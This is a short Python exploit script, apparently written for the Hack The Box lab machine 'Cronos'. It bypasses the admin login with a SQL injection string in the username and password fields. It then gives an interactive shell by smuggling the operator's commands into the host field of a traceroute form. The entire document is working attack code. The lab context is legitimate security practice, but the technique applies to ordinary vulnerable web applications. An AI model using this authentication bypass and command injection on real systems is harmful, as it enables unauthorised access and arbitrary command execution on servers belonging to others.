#!/bin/env/python3

import requests

# CRONOS HTB RCE
# Date: 04/03/2021
# Exploit Author: C4yyyy [@C4yyyy on Twitter]
# Tested on: Linux


url = 'http://admin.cronos.htb/index.php'
rce_url = 'http://admin.cronos.htb/welcome.php'


if __name__ == '__main__':

    s = requests.Session()
    
    data_post = {
        'username': "' or 1=1 -- -",
        'password': "' or 1=1 -- -"
    }

    r = s.post(url,data=data_post)

    while True:

        rce = input("Command: ")

        data_post = {

        'command': 'traceroute',
        'host': '%s' % rce
        }

        r = s.post(rce_url, data=data_post)
        print(r.text)